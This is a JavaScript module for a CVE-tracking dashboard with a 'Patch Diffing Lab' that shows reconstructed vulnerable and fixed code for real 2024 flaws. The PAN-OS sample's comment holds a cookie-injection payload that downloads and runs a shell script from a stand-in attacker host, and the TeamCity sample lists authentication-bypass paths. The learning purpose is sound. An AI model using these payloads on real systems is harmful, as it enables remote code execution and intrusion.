/* ==================== CVE WATCH & PATCH DIFFING üî¥üì° ==================== */
/* Real-Time CVE Radar + Patch Analysis for N-Day Exploit Hunting */

window.CVEWatch = {
    // --- STATE ---
    currentTab: 'latest',
    cves: [],
    selectedCVE: null,
    filters: {
        severity: 'all',
        vendor: 'all',
        search: ''
    },
    isLoading: false,

    // --- CVE SOURCES ---
    sources: [
        { name: 'NVD', url: 'https://nvd.nist.gov/', icon: 'üèõÔ∏è' },
        { name: 'CISA KEV', url: 'https://cisa.gov/known-exploited-vulnerabilities-catalog', icon: 'üö®' },
        { name: 'Exploit-DB', url: 'https://exploit-db.com/', icon: 'üíÄ' },
        { name: 'GitHub Security', url: 'https://github.com/advisories', icon: 'üêô' },
        { name: 'PacketStorm', url: 'https://packetstormsecurity.com/', icon: '‚ö°' }
    ],

    // --- SEVERITY COLORS ---
    severityColors: {
        'CRITICAL': { bg: 'rgba(220,38,38,0.2)', text: '#dc2626', score: '9.0-10.0' },
        'HIGH': { bg: 'rgba(234,88,12,0.2)', text: '#ea580c', score: '7.0-8.9' },
        'MEDIUM': { bg: 'rgba(202,138,4,0.2)', text: '#ca8a04', score: '4.0-6.9' },
        'LOW': { bg: 'rgba(34,197,94,0.2)', text: '#22c55e', score: '0.1-3.9' }
    },

    // --- SAMPLE CVE DATA (Would be fetched from API in production) ---
    sampleCVEs: [
        {
            id: 'CVE-2024-21762',
            title: 'Fortinet FortiOS Out-of-bound Write',
            vendor: 'Fortinet',
            product: 'FortiOS',
            severity: 'CRITICAL',
            cvss: 9.8,
            published: '2024-02-08',
            description: 'An out-of-bounds write vulnerability in FortiOS SSL VPN may allow a remote unauthenticated attacker to execute arbitrary code via specially crafted HTTP requests.',
            cwe: 'CWE-787',
            exploitAvailable: true,
            patchAvailable: true,
            affectedVersions: ['7.4.0-7.4.2', '7.2.0-7.2.6', '7.0.0-7.0.13'],
            references: ['https://fortiguard.com/psirt/FG-IR-24-015'],
            tags: ['RCE', 'Pre-Auth', 'Network']
        },
        {
            id: 'CVE-2024-3400',
            title: 'Palo Alto PAN-OS Command Injection',
            vendor: 'Palo Alto',
            product: 'PAN-OS GlobalProtect',
            severity: 'CRITICAL',
            cvss: 10.0,
            published: '2024-04-12',
            description: 'A command injection vulnerability in the GlobalProtect feature of Palo Alto Networks PAN-OS allows an unauthenticated attacker to execute arbitrary code with root privileges.',
            cwe: 'CWE-77',
            exploitAvailable: true,
            patchAvailable: true,
            affectedVersions: ['PAN-OS 11.1', 'PAN-OS 11.0', 'PAN-OS 10.2'],
            references: ['https://security.paloaltonetworks.com/CVE-2024-3400'],
            tags: ['RCE', 'Pre-Auth', '0-Day']
        },
        {
            id: 'CVE-2024-27198',
            title: 'JetBrains TeamCity Authentication Bypass',
            vendor: 'JetBrains',
            product: 'TeamCity',
            severity: 'CRITICAL',
            cvss: 9.8,
            published: '2024-03-04',
            description: 'Authentication bypass vulnerability in JetBrains TeamCity allows a remote unauthenticated attacker to gain administrative access.',
            cwe: 'CWE-288',
            exploitAvailable: true,
            patchAvailable: true,
            affectedVersions: ['< 2023.11.4'],
            references: ['https://blog.jetbrains.com/teamcity/2024/03/'],
            tags: ['Auth Bypass', 'Pre-Auth', 'Critical Infra']
        },
        {
            id: 'CVE-2024-23897',
            title: 'Jenkins CLI Arbitrary File Read',
            vendor: 'Jenkins',
            product: 'Jenkins Core',
            severity: 'CRITICAL',
            cvss: 9.8,
            published: '2024-01-24',
            description: 'Jenkins CLI allows attackers to read arbitrary files on the Jenkins controller file system.',
            cwe: 'CWE-22',
            exploitAvailable: true,
            patchAvailable: true,
            affectedVersions: ['< 2.442', '< LTS 2.426.3'],
            references: ['https://www.jenkins.io/security/advisory/2024-01-24/'],
            tags: ['LFI', 'Pre-Auth', 'CI/CD']
        },
        {
            id: 'CVE-2024-1709',
            title: 'ConnectWise ScreenConnect Authentication Bypass',
            vendor: 'ConnectWise',
            product: 'ScreenConnect',
            severity: 'CRITICAL',
            cvss: 10.0,
            published: '2024-02-19',
            description: 'Authentication bypass using an alternate path or channel in ConnectWise ScreenConnect allows an attacker to gain administrative access.',
            cwe: 'CWE-288',
            exploitAvailable: true,
            patchAvailable: true,
            affectedVersions: ['< 23.9.8'],
            references: ['https://www.connectwise.com/company/trust/security-bulletins/'],
            tags: ['Auth Bypass', 'RMM', 'Mass Exploitation']
        },
        {
            id: 'CVE-2023-46805',
            title: 'Ivanti Connect Secure Auth Bypass',
            vendor: 'Ivanti',
            product: 'Connect Secure',
            severity: 'HIGH',
            cvss: 8.2,
            published: '2024-01-10',
            description: 'Authentication bypass in Ivanti Connect Secure and Policy Secure web components allows a remote attacker to access restricted resources.',
            cwe: 'CWE-287',
            exploitAvailable: true,
            patchAvailable: true,
            affectedVersions: ['9.x', '22.x'],
            references: ['https://forums.ivanti.com/'],
            tags: ['Auth Bypass', 'VPN', 'Chained']
        }
    ],

    // --- PATCH DIFF SAMPLES ---
    patchSamples: [
        {
            cve: 'CVE-2024-23897',
            repo: 'jenkinsci/jenkins',
            commit: 'abc123def',
            file: 'core/src/main/java/hudson/cli/CLICommand.java',
            description: 'Fix for arbitrary file read via CLI args expansion',
            oldCode: `public class CLICommand {
    @Argument(required=true)
    public String name;
    
    protected void execute() {
        // Vulnerable: args starting with @ are expanded as file paths
        String content = expandArgs(name);
        processCommand(content);
    }
    
    private String expandArgs(String arg) {
        if (arg.startsWith("@")) {
            // VULNERABLE: No path validation!
            return readFile(arg.substring(1));
        }
        return arg;
    }
}`,
            newCode: `public class CLICommand {
    @Argument(required=true)
    public String name;
    
    protected void execute() {
        // Fixed: Disable file expansion for untrusted input
        String content = expandArgsSafe(name);
        processCommand(content);
    }
    
    private String expandArgsSafe(String arg) {
        if (arg.startsWith("@")) {
            // FIXED: Reject file expansion in web context
            if (isWebContext()) {
                throw new SecurityException("File expansion disabled");
            }
            // Additional path validation
            String path = arg.substring(1);
            if (!isAllowedPath(path)) {
                throw new SecurityException("Invalid path");
            }
            return readFile(path);
        }
        return arg;
    }
    
    private boolean isAllowedPath(String path) {
        // Validate path is within allowed directories
        return path.startsWith(JENKINS_HOME) && !path.contains("..");
    }
}`
        },
        {
            cve: 'CVE-2024-3400',
            repo: 'N/A (Closed Source)',
            commit: 'N/A',
            file: 'GlobalProtect Gateway - Telemetry Handler',
            description: 'Command injection via SESSID cookie in telemetry endpoint',
            oldCode: `# Vulnerable GlobalProtect handler (reconstructed)
def handle_telemetry_request(request):
    session_id = request.cookies.get('SESSID')
    
    # VULNERABLE: Direct shell command execution with user input
    log_file = f"/var/log/pan/gp_{session_id}.log"
    os.system(f"touch {log_file}")
    
    # Attacker can inject: SESSID=;curl attacker.com/shell.sh|bash;
    return process_telemetry(request)`,
            newCode: `# Fixed GlobalProtect handler (reconstructed)
import shlex
import re

def handle_telemetry_request(request):
    session_id = request.cookies.get('SESSID')
    
    # FIXED: Validate session ID format
    if not re.match(r'^[a-zA-Z0-9_-]+$', session_id):
        raise ValueError("Invalid session ID format")
    
    # FIXED: Use safe path construction
    log_file = os.path.join("/var/log/pan", f"gp_{session_id}.log")
    
    # FIXED: Avoid shell=True, use safe file operations
    Path(log_file).touch(exist_ok=True)
    
    return process_telemetry(request)`
        },
        {
            cve: 'CVE-2024-27198',
            repo: 'N/A (Closed Source)',
            commit: 'N/A',
            file: 'TeamCity Authentication Filter',
            description: 'Authentication bypass via path traversal in REST API',
            oldCode: `// Vulnerable TeamCity Auth (reconstructed)
public class AuthenticationFilter {
    
    private static final List<String> PUBLIC_PATHS = Arrays.asList(
        "/app/rest/server",
        "/app/rest/version"
    );
    
    public void doFilter(Request request) {
        String path = request.getRequestURI();
        
        // VULNERABLE: Path check before normalization
        if (isPublicPath(path)) {
            chain.doFilter(request);
            return;
        }
        
        // Bypass: /app/rest/server;.jsp or /app/rest/server%2F..%2Fusers
        requireAuthentication(request);
    }
}`,
            newCode: `// Fixed TeamCity Auth (reconstructed)
public class AuthenticationFilter {
    
    private static final List<String> PUBLIC_PATHS = Arrays.asList(
        "/app/rest/server",
        "/app/rest/version"
    );
    
    public void doFilter(Request request) {
        // FIXED: Normalize path BEFORE checking
        String rawPath = request.getRequestURI();
        String normalizedPath = normalizePath(rawPath);
        
        // FIXED: Reject paths with traversal attempts
        if (containsTraversal(rawPath) || containsEncodedChars(rawPath)) {
            response.sendError(400, "Invalid request path");
            return;
        }
        
        if (isPublicPath(normalizedPath)) {
            chain.doFilter(request);
            return;
        }
        
        requireAuthentication(request);
    }
    
    private String normalizePath(String path) {
        // Remove matrix parameters, decode, resolve ../
        return Paths.get(URLDecoder.decode(path))
                    .normalize()
                    .toString()
                    .split(";")[0];
    }
}`
        }
    ],

    // --- RENDER ---
    render() {
        return `
            <div class="cve-app fade-in">
                <div class="cve-header">
                    <div class="header-left">
                        <h1><i class="fas fa-radar"></i> CVE Radar</h1>
                        <p class="subtitle">Real-Time Vulnerability Intelligence & Patch Analysis</p>
                    </div>
                    <div class="header-right">
                        <button onclick="CVEWatch.refreshCVEs()" class="refresh-btn">
                            <i class="fas fa-sync-alt ${this.isLoading ? 'fa-spin' : ''}"></i> Refresh
                        </button>
                        <span class="last-update">Last update: ${new Date().toLocaleTimeString()}</span>
                    </div>
                </div>

                <div class="cve-sources">
                    ${this.sources.map(s => `
                        <a href="${s.url}" target="_blank" class="source-chip">
                            <span>${s.icon}</span> ${s.name}
                        </a>
                    `).join('')}
                </div>

                <div class="cve-tabs">
                    <div class="tab ${this.currentTab === 'latest' ? 'active' : ''}" onclick="CVEWatch.switchTab('latest')">
                        <i class="fas fa-fire"></i> Latest CVEs
                    </div>
                    <div class="tab ${this.currentTab === 'critical' ? 'active' : ''}" onclick="CVEWatch.switchTab('critical')">
                        <i class="fas fa-skull-crossbones"></i> Critical Only
                    </div>
                    <div class="tab ${this.currentTab === 'exploited' ? 'active' : ''}" onclick="CVEWatch.switchTab('exploited')">
                        <i class="fas fa-bolt"></i> Actively Exploited
                    </div>
                    <div class="tab ${this.currentTab === 'patchdiff' ? 'active' : ''}" onclick="CVEWatch.switchTab('patchdiff')">
                        <i class="fas fa-code-compare"></i> Patch Diffing
                    </div>
                    <div class="tab ${this.currentTab === 'search' ? 'active' : ''}" onclick="CVEWatch.switchTab('search')">
                        <i class="fas fa-search"></i> Search
                    </div>
                </div>

                <div class="cve-content">
                    ${this.renderTabContent()}
                </div>
            </div>
            ${this.getStyles()}
        `;
    },

    renderTabContent() {
        switch (this.currentTab) {
            case 'latest': return this.renderCVEList(this.sampleCVEs);
            case 'critical': return this.renderCVEList(this.sampleCVEs.filter(c => c.severity === 'CRITICAL'));
            case 'exploited': return this.renderCVEList(this.sampleCVEs.filter(c => c.exploitAvailable));
            case 'patchdiff': return this.renderPatchDiffing();
            case 'search': return this.renderSearch();
            default: return '';
        }
    },

    renderCVEList(cves) {
        if (cves.length === 0) {
            return '<div class="empty-state"><i class="fas fa-shield-alt"></i><p>No CVEs found matching filters</p></div>';
        }

        return `
            <div class="cve-stats">
                <div class="stat critical"><span>${this.sampleCVEs.filter(c => c.severity === 'CRITICAL').length}</span>Critical</div>
                <div class="stat high"><span>${this.sampleCVEs.filter(c => c.severity === 'HIGH').length}</span>High</div>
                <div class="stat exploited"><span>${this.sampleCVEs.filter(c => c.exploitAvailable).length}</span>Exploited</div>
                <div class="stat total"><span>${this.sampleCVEs.length}</span>Total</div>
            </div>

            <div class="cve-list">
                ${cves.map(cve => this.renderCVECard(cve)).join('')}
            </div>
        `;
    },

    renderCVECard(cve) {
        const sevColor = this.severityColors[cve.severity];
        return `
            <div class="cve-card" onclick="CVEWatch.showCVEDetail('${cve.id}')">
                <div class="cve-card-header">
                    <span class="cve-id">${cve.id}</span>
                    <span class="cve-severity" style="background: ${sevColor.bg}; color: ${sevColor.text}">
                        ${cve.severity} (${cve.cvss})
                    </span>
                </div>
                <h3 class="cve-title">${cve.title}</h3>
                <p class="cve-desc">${cve.description.substring(0, 150)}...</p>
                <div class="cve-meta">
                    <span><i class="fas fa-building"></i> ${cve.vendor}</span>
                    <span><i class="fas fa-box"></i> ${cve.product}</span>
                    <span><i class="fas fa-calendar"></i> ${cve.published}</span>
                </div>
                <div class="cve-tags">
                    ${cve.tags.map(t => `<span class="tag">${t}</span>`).join('')}
                    ${cve.exploitAvailable ? '<span class="tag exploit">üî• Exploit Available</span>' : ''}
                </div>
            </div>
        `;
    },

    renderPatchDiffing() {
        return `
            <div class="patchdiff-section">
                <div class="patchdiff-intro">
                    <h2><i class="fas fa-code-compare"></i> Patch Diffing Lab</h2>
                    <p>Learn to discover vulnerabilities by analyzing security patches. This is how researchers find N-day exploits!</p>
                    <div class="methodology-box">
                        <h4>üéØ Patch Diffing Methodology</h4>
                        <ol>
                            <li><strong>Get the patch:</strong> Download commits from GitHub/GitLab that fix security issues</li>
                            <li><strong>Identify the fix:</strong> Look for input validation, bounds checking, authentication changes</li>
                            <li><strong>Understand the vulnerability:</strong> What was missing? What could an attacker do?</li>
                            <li><strong>Write the exploit:</strong> Craft input that triggers the vulnerable code path</li>
                            <li><strong>Test safely:</strong> Only on systems you own or have permission to test</li>
                        </ol>
                    </div>
                </div>

                <h3>üìö Practice Patch Analysis</h3>
                <div class="patch-samples">
                    ${this.patchSamples.map((p, i) => this.renderPatchSample(p, i)).join('')}
                </div>
            </div>
        `;
    },

    renderPatchSample(patch, index) {
        return `
            <div class="patch-card">
                <div class="patch-header">
                    <span class="patch-cve">${patch.cve}</span>
                    <span class="patch-repo"><i class="fab fa-github"></i> ${patch.repo}</span>
                </div>
                <h4>${patch.description}</h4>
                <p class="patch-file"><i class="fas fa-file-code"></i> ${patch.file}</p>
                
                <div class="diff-viewer">
                    <div class="diff-header">
                        <button class="diff-tab active" onclick="CVEWatch.showDiffTab(${index}, 'split')">Split View</button>
                        <button class="diff-tab" onclick="CVEWatch.showDiffTab(${index}, 'unified')">Unified</button>
                    </div>
                    <div class="diff-content split" id="diff-${index}">
                        <div class="diff-pane old">
                            <div class="pane-header"><i class="fas fa-minus-circle"></i> Vulnerable Code</div>
                            <pre><code>${this.highlightVulnCode(patch.oldCode)}</code></pre>
                        </div>
                        <div class="diff-pane new">
                            <div class="pane-header"><i class="fas fa-plus-circle"></i> Fixed Code</div>
                            <pre><code>${this.highlightFixCode(patch.newCode)}</code></pre>
                        </div>
                    </div>
                </div>

                <div class="patch-analysis">
                    <button onclick="CVEWatch.analyzeWithAI('${patch.cve}', ${index})">
                        <i class="fas fa-robot"></i> Analyze with AI
                    </button>
                    <button onclick="CVEWatch.copyCode('old', ${index})">
                        <i class="fas fa-copy"></i> Copy Vulnerable
                    </button>
                </div>
            </div>
        `;
    },

    renderSearch() {
        return `
            <div class="search-section">
                <div class="search-box">
                    <input type="text" id="cve-search" placeholder="Search CVE ID, vendor, product, or keyword..."
                           onkeyup="CVEWatch.performSearch()">
                    <button onclick="CVEWatch.performSearch()"><i class="fas fa-search"></i></button>
                </div>

                <div class="search-filters">
                    <select id="filter-severity" onchange="CVEWatch.performSearch()">
                        <option value="all">All Severities</option>
                        <option value="CRITICAL">Critical</option>
                        <option value="HIGH">High</option>
                        <option value="MEDIUM">Medium</option>
                    </select>
                    <select id="filter-year" onchange="CVEWatch.performSearch()">
                        <option value="all">All Years</option>
                        <option value="2024">2024</option>
                        <option value="2023">2023</option>
                        <option value="2022">2022</option>
                    </select>
                </div>

                <div id="search-results" class="search-results">
                    <p class="search-hint">Enter a CVE ID or keyword to search</p>
                </div>

                <div class="external-search">
                    <h4>External Resources</h4>
                    <div class="external-links">
                        <a href="https://nvd.nist.gov/vuln/search" target="_blank"><i class="fas fa-database"></i> NVD Search</a>
                        <a href="https://cve.mitre.org/cve/search_cve_list.html" target="_blank"><i class="fas fa-list"></i> MITRE CVE</a>
                        <a href="https://www.exploit-db.com/search" target="_blank"><i class="fas fa-skull"></i> Exploit-DB</a>
                        <a href="https://vulners.com/" target="_blank"><i class="fas fa-search"></i> Vulners</a>
                    </div>
                </div>
            </div>
        `;
    },

    // --- ACTIONS ---
    switchTab(tab) {
        this.currentTab = tab;
        this.reRender();
    },

    showCVEDetail(cveId) {
        const cve = this.sampleCVEs.find(c => c.id === cveId);
        if (!cve) return;

        const sevColor = this.severityColors[cve.severity];
        const modal = document.createElement('div');
        modal.className = 'cve-modal';
        modal.innerHTML = `
            <div class="modal-content">
                <div class="modal-header" style="border-color: ${sevColor.text}">
                    <div>
                        <span class="cve-id">${cve.id}</span>
                        <span class="cve-severity" style="background: ${sevColor.bg}; color: ${sevColor.text}">
                            ${cve.severity} (${cve.cvss})
                        </span>
                    </div>
                    <button onclick="this.closest('.cve-modal').remove()"><i class="fas fa-times"></i></button>
                </div>
                <div class="modal-body">
                    <h2>${cve.title}</h2>
                    <p class="description">${cve.description}</p>
                    
                    <div class="detail-grid">
                        <div class="detail-item">
                            <label>Vendor</label>
                            <span>${cve.vendor}</span>
                        </div>
                        <div class="detail-item">
                            <label>Product</label>
                            <span>${cve.product}</span>
                        </div>
                        <div class="detail-item">
                            <label>CWE</label>
                            <span>${cve.cwe}</span>
                        </div>
                        <div class="detail-item">
                            <label>Published</label>
                            <span>${cve.published}</span>
                        </div>
                    </div>

                    <div class="affected-versions">
                        <h4>Affected Versions</h4>
                        <ul>${cve.affectedVersions.map(v => `<li>${v}</li>`).join('')}</ul>
                    </div>

                    <div class="cve-tags">
                        ${cve.tags.map(t => `<span class="tag">${t}</span>`).join('')}
                    </div>

                    <div class="cve-actions">
                        ${cve.exploitAvailable ? '<a href="https://exploit-db.com" target="_blank" class="btn exploit"><i class="fas fa-bolt"></i> Find Exploit</a>' : ''}
                        <a href="https://nvd.nist.gov/vuln/detail/${cve.id}" target="_blank" class="btn"><i class="fas fa-external-link-alt"></i> NVD Details</a>
                        <button onclick="CVEWatch.askAIAboutCVE('${cve.id}')" class="btn ai"><i class="fas fa-robot"></i> Ask AI</button>
                    </div>
                </div>
            </div>
        `;
        document.body.appendChild(modal);
        modal.onclick = (e) => { if (e.target === modal) modal.remove(); };
    },

    highlightVulnCode(code) {
        // Highlight vulnerable patterns
        return code
            .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
            .replace(/(VULNERABLE|No.*validation|Direct.*execution|shell=True)/gi, '<span class="vuln-highlight">$1</span>')
            .replace(/\/\/.*$/gm, '<span class="comment">$&</span>');
    },

    highlightFixCode(code) {
        // Highlight fix patterns
        return code
            .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
            .replace(/(FIXED|validate|sanitize|reject|isAllowed|normalize)/gi, '<span class="fix-highlight">$1</span>')
            .replace(/\/\/.*$/gm, '<span class="comment">$&</span>');
    },

    showDiffTab(index, mode) {
        const diff = document.getElementById(`diff-${index}`);
        if (diff) {
            diff.className = `diff-content ${mode}`;
        }
    },

    performSearch() {
        const query = document.getElementById('cve-search')?.value.toLowerCase() || '';
        const severity = document.getElementById('filter-severity')?.value || 'all';

        let results = this.sampleCVEs.filter(cve => {
            const matchQuery = cve.id.toLowerCase().includes(query) ||
                cve.title.toLowerCase().includes(query) ||
                cve.vendor.toLowerCase().includes(query) ||
                cve.product.toLowerCase().includes(query);
            const matchSeverity = severity === 'all' || cve.severity === severity;
            return matchQuery && matchSeverity;
        });

        const container = document.getElementById('search-results');
        if (container) {
            if (query.length === 0) {
                container.innerHTML = '<p class="search-hint">Enter a CVE ID or keyword to search</p>';
            } else if (results.length === 0) {
                container.innerHTML = '<p class="no-results">No results found</p>';
            } else {
                container.innerHTML = results.map(cve => this.renderCVECard(cve)).join('');
            }
        }
    },

    refreshCVEs() {
        this.isLoading = true;
        this.reRender();

        // Simulate API call
        setTimeout(() => {
            this.isLoading = false;
            this.reRender();
        }, 1500);
    },

    analyzeWithAI(cveId, patchIndex) {
        const patch = this.patchSamples[patchIndex];
        if (window.AISecurityAssistant) {
            AISecurityAssistant.toggle();
            setTimeout(() => {
                document.getElementById('ai-input').value =
                    `Analyze this security patch for ${cveId}. The vulnerability was: ${patch.description}. ` +
                    `What was the root cause of the vulnerability and how does the fix address it?`;
                AISecurityAssistant.send();
            }, 300);
        }
    },

    askAIAboutCVE(cveId) {
        const cve = this.sampleCVEs.find(c => c.id === cveId);
        if (window.AISecurityAssistant && cve) {
            document.querySelector('.cve-modal')?.remove();
            AISecurityAssistant.toggle();
            setTimeout(() => {
                document.getElementById('ai-input').value =
                    `Explain ${cveId} (${cve.title}) in detail. How can I test for this vulnerability? ` +
                    `Provide detection methods and exploitation techniques.`;
                AISecurityAssistant.send();
            }, 300);
        }
    },

    copyCode(type, index) {
        const patch = this.patchSamples[index];
        const code = type === 'old' ? patch.oldCode : patch.newCode;
        navigator.clipboard.writeText(code);
    },

    reRender() {
        const app = document.querySelector('.cve-app');
        if (app) app.outerHTML = this.render();
    },

    getStyles() {
        return `<style>
            .cve-app { min-height: calc(100vh - 60px); background: linear-gradient(135deg, #0a0a12 0%, #1a1a2e 100%); color: #e0e0e0; padding: 25px; font-family: 'Segoe UI', sans-serif; }
            .cve-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 15px; }
            .cve-header h1 { margin: 0; color: #ef4444; font-size: 1.8rem; }
            .cve-header .subtitle { color: #888; margin: 5px 0 0; }
            .header-right { display: flex; align-items: center; gap: 15px; }
            .refresh-btn { padding: 10px 20px; background: #ef4444; border: none; border-radius: 8px; color: #fff; cursor: pointer; }
            .last-update { color: #666; font-size: 0.85rem; }

            .cve-sources { display: flex; gap: 10px; margin-bottom: 20px; flex-wrap: wrap; }
            .source-chip { padding: 8px 15px; background: rgba(255,255,255,0.05); border-radius: 20px; color: #888; text-decoration: none; font-size: 0.85rem; transition: 0.2s; }
            .source-chip:hover { background: rgba(239,68,68,0.2); color: #ef4444; }

            .cve-tabs { display: flex; gap: 5px; margin-bottom: 20px; flex-wrap: wrap; }
            .tab { padding: 12px 20px; border-radius: 8px; cursor: pointer; color: #888; transition: 0.2s; display: flex; align-items: center; gap: 8px; }
            .tab:hover { color: #fff; background: rgba(255,255,255,0.05); }
            .tab.active { background: #ef4444; color: #fff; }

            .cve-stats { display: flex; gap: 15px; margin-bottom: 25px; flex-wrap: wrap; }
            .stat { background: rgba(0,0,0,0.3); padding: 15px 25px; border-radius: 12px; text-align: center; }
            .stat span { display: block; font-size: 2rem; font-weight: bold; }
            .stat.critical span { color: #ef4444; }
            .stat.high span { color: #ea580c; }
            .stat.exploited span { color: #f59e0b; }
            .stat.total span { color: #8b5cf6; }

            .cve-list { display: grid; grid-template-columns: repeat(auto-fill, minmax(400px, 1fr)); gap: 20px; }
            .cve-card { background: rgba(0,0,0,0.3); padding: 20px; border-radius: 12px; cursor: pointer; transition: 0.2s; border-left: 3px solid transparent; }
            .cve-card:hover { transform: translateY(-3px); border-left-color: #ef4444; }
            .cve-card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
            .cve-id { font-family: monospace; color: #8b5cf6; font-weight: bold; }
            .cve-severity { padding: 4px 12px; border-radius: 12px; font-size: 0.75rem; font-weight: bold; }
            .cve-title { margin: 0 0 10px; color: #fff; font-size: 1.1rem; }
            .cve-desc { color: #888; font-size: 0.9rem; margin: 0 0 15px; line-height: 1.5; }
            .cve-meta { display: flex; gap: 20px; color: #666; font-size: 0.85rem; margin-bottom: 15px; flex-wrap: wrap; }
            .cve-tags { display: flex; gap: 8px; flex-wrap: wrap; }
            .tag { padding: 4px 10px; background: rgba(139,92,246,0.2); color: #a78bfa; border-radius: 12px; font-size: 0.75rem; }
            .tag.exploit { background: rgba(239,68,68,0.2); color: #ef4444; }

            .patchdiff-section { max-width: 1200px; }
            .patchdiff-intro { margin-bottom: 30px; }
            .patchdiff-intro h2 { color: #8b5cf6; margin: 0 0 10px; }
            .methodology-box { background: rgba(139,92,246,0.1); border: 1px solid rgba(139,92,246,0.3); padding: 20px; border-radius: 12px; margin-top: 20px; }
            .methodology-box h4 { color: #a78bfa; margin: 0 0 15px; }
            .methodology-box ol { margin: 0; padding-left: 20px; }
            .methodology-box li { margin: 8px 0; color: #ccc; }

            .patch-samples { display: flex; flex-direction: column; gap: 25px; }
            .patch-card { background: rgba(0,0,0,0.3); border-radius: 12px; overflow: hidden; }
            .patch-header { display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; background: rgba(0,0,0,0.3); }
            .patch-cve { color: #ef4444; font-weight: bold; font-family: monospace; }
            .patch-repo { color: #888; }
            .patch-card h4 { margin: 15px 20px 10px; color: #fff; }
            .patch-file { margin: 0 20px 15px; color: #666; font-family: monospace; font-size: 0.85rem; }

            .diff-viewer { margin: 0 20px 15px; }
            .diff-header { display: flex; gap: 5px; margin-bottom: 10px; }
            .diff-tab { padding: 8px 15px; background: rgba(255,255,255,0.05); border: none; border-radius: 6px; color: #888; cursor: pointer; }
            .diff-tab.active { background: #8b5cf6; color: #fff; }
            .diff-content { display: flex; gap: 15px; }
            .diff-content.unified { flex-direction: column; }
            .diff-pane { flex: 1; background: #0a0a12; border-radius: 8px; overflow: hidden; }
            .pane-header { padding: 10px 15px; background: rgba(0,0,0,0.5); font-size: 0.85rem; }
            .diff-pane.old .pane-header { color: #ef4444; }
            .diff-pane.new .pane-header { color: #22c55e; }
            .diff-pane pre { margin: 0; padding: 15px; overflow-x: auto; font-size: 0.85rem; line-height: 1.6; }
            .diff-pane code { color: #e0e0e0; }
            .vuln-highlight { background: rgba(239,68,68,0.3); color: #ef4444; padding: 2px 4px; border-radius: 3px; }
            .fix-highlight { background: rgba(34,197,94,0.3); color: #22c55e; padding: 2px 4px; border-radius: 3px; }
            .comment { color: #666; }

            .patch-analysis { display: flex; gap: 10px; padding: 15px 20px; background: rgba(0,0,0,0.2); }
            .patch-analysis button { padding: 10px 18px; background: rgba(139,92,246,0.2); border: 1px solid rgba(139,92,246,0.3); border-radius: 8px; color: #a78bfa; cursor: pointer; transition: 0.2s; }
            .patch-analysis button:hover { background: #8b5cf6; color: #fff; }

            .search-section { max-width: 800px; }
            .search-box { display: flex; gap: 10px; margin-bottom: 20px; }
            .search-box input { flex: 1; padding: 15px 20px; background: rgba(0,0,0,0.3); border: 1px solid #333; border-radius: 10px; color: #fff; font-size: 1rem; }
            .search-box button { padding: 15px 25px; background: #ef4444; border: none; border-radius: 10px; color: #fff; cursor: pointer; }
            .search-filters { display: flex; gap: 15px; margin-bottom: 25px; }
            .search-filters select { padding: 10px 15px; background: rgba(0,0,0,0.3); border: 1px solid #333; border-radius: 8px; color: #fff; }
            .search-results { min-height: 200px; }
            .search-hint, .no-results { color: #666; text-align: center; padding: 40px; }
            .external-search { margin-top: 40px; }
            .external-search h4 { color: #888; margin: 0 0 15px; }
            .external-links { display: flex; gap: 15px; flex-wrap: wrap; }
            .external-links a { padding: 12px 20px; background: rgba(0,0,0,0.3); border-radius: 10px; color: #888; text-decoration: none; transition: 0.2s; }
            .external-links a:hover { background: rgba(239,68,68,0.2); color: #ef4444; }

            .cve-modal { position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 10001; display: flex; align-items: center; justify-content: center; padding: 20px; }
            .modal-content { background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); border-radius: 16px; max-width: 700px; width: 100%; max-height: 90vh; overflow-y: auto; }
            .modal-header { display: flex; justify-content: space-between; align-items: center; padding: 20px; border-bottom: 2px solid; }
            .modal-header button { background: none; border: none; color: #888; font-size: 1.2rem; cursor: pointer; }
            .modal-body { padding: 25px; }
            .modal-body h2 { margin: 0 0 15px; color: #fff; }
            .modal-body .description { color: #ccc; line-height: 1.6; margin-bottom: 20px; }
            .detail-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; margin-bottom: 20px; }
            .detail-item { background: rgba(0,0,0,0.3); padding: 15px; border-radius: 8px; }
            .detail-item label { display: block; color: #888; font-size: 0.85rem; margin-bottom: 5px; }
            .detail-item span { color: #fff; }
            .affected-versions { margin-bottom: 20px; }
            .affected-versions h4 { color: #ef4444; margin: 0 0 10px; }
            .affected-versions ul { margin: 0; padding-left: 20px; }
            .affected-versions li { color: #ccc; margin: 5px 0; }
            .cve-actions { display: flex; gap: 10px; flex-wrap: wrap; margin-top: 20px; }
            .cve-actions .btn { padding: 12px 20px; background: rgba(255,255,255,0.1); border: none; border-radius: 8px; color: #fff; cursor: pointer; text-decoration: none; display: inline-flex; align-items: center; gap: 8px; }
            .cve-actions .btn.exploit { background: rgba(239,68,68,0.3); }
            .cve-actions .btn.ai { background: rgba(139,92,246,0.3); }

            .empty-state { text-align: center; padding: 60px 20px; color: #666; }
            .empty-state i { font-size: 3rem; margin-bottom: 15px; }

            @media (max-width: 800px) {
                .cve-list { grid-template-columns: 1fr; }
                .diff-content { flex-direction: column; }
                .detail-grid { grid-template-columns: 1fr; }
            }
        </style>`;
    }
};

function pageCVEWatch() {
    return CVEWatch.render();
}
